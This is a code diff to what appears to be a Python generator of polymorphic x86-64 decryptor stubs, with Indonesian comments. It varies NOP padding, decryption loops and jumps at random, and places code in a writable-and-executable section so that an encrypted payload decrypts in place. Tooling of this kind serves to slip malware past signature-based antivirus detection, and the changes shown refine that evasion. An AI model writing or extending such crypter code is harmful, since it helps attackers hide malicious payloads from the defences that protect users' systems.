@@ -34,7 +34,7 @@ NOP_POOL = [
     "nop",
     "xchg %ax,%ax",
     "nopw",
-    "nopw 0x0(%rax,%rax,1)",
+    "movq %r10,%r10",
 ]
 
 INIT_SRC = [
@@ -80,7 +80,7 @@ def build_stub(rng, enc_bytes, key_bytes, qword):
     if qword:
         body_style = "qword"
     body = rng.choice(BODY_QWORD if body_style == "qword" else BODY_BYTE)
-    decr = rng.choice(DECR_LOOP)
+    decr = rng.choice(DECR_LOOP).format(cnt=cnt)
     jmp = rng.choice(JUMP_ENC)
     init_src = rng.choice(INIT_SRC).format(src=src)
     init_key = rng.choice(INIT_KEY).format(key=key)
@@ -104,7 +104,8 @@ def build_stub(rng, enc_bytes, key_bytes, qword):
     key_lines = ", ".join("0x%02x" % b for b in key_bytes)
 
     return f"""# polymorphic stub — varian acak (jangan commit, regenerasi tiap run)
-.section .text, "awx"
+# section custom "awx" = writable + executable (payload didekripsi di tempat)
+.section .morph, "awx"
 .globl _start
 _start:
         # init (varian)
